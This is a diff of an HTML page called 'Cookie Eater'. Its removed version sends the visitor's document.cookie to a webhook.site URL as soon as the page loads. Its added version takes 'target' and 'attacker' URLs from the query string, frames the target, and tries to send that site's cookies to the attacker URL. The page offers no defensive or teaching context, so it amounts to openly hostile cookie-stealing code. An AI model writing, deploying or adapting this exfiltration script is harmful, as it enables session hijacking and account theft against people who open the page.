@@ -3,23 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie eater</title>
+    <title>Cookie Eater</title>
 </head>
 <body>
     <h1>Welcome!</h1>
-    <p>If you see this message, cookies are being sent...</p>
+    <p>If you see this message, cookies are being eaten...</p>
+
+    <iframe id="targetFrame" style="width:100%; height:500px;"></iframe>
 
     <script>
-        // Function to send cookies to the specified URL
-        function sendCookies() {
-            var cookies = document.cookie;
-            var img = new Image();
-            img.src = "https://webhook.site/9c6a373b-cb85-497d-a289-dd35bb13ceb4" + encodeURIComponent(cookies);
+        function getQueryParams() {
+            var params = {};
+            var queryString = window.location.search.substring(1);
+            var queryArray = queryString.split("&");
+            for (var i = 0; i < queryArray.length; i++) {
+                var pair = queryArray[i].split("=");
+                params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
+            }
+            return params;
         }
 
-        // Execute the function after the page loads
+        function sendCookies(attackerUrl, cookies) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", attackerUrl + "?cookie=" + encodeURIComponent(cookies), true);
+            xhr.send();
+        }
+
         window.onload = function() {
-            sendCookies();
+            var params = getQueryParams();
+            var targetUrl = params['target'];
+            var attackerUrl = params['attacker'];
+            
+            if (targetUrl && attackerUrl) {
+                document.getElementById('targetFrame').src = targetUrl;
+                
+                try {
+                    var targetFrame = document.getElementById('targetFrame').contentWindow;
+                    var cookies = targetFrame.document.cookie;
+                    sendCookies(attackerUrl, cookies);
+                } catch (e) {
+                    console.error('Unable to access cookies from the iframe due to SOP:', e);
+                }
+            } else {
+                console.error('Missing target or attacker URL in query parameters.');
+            }
         };
     </script>
 </body>
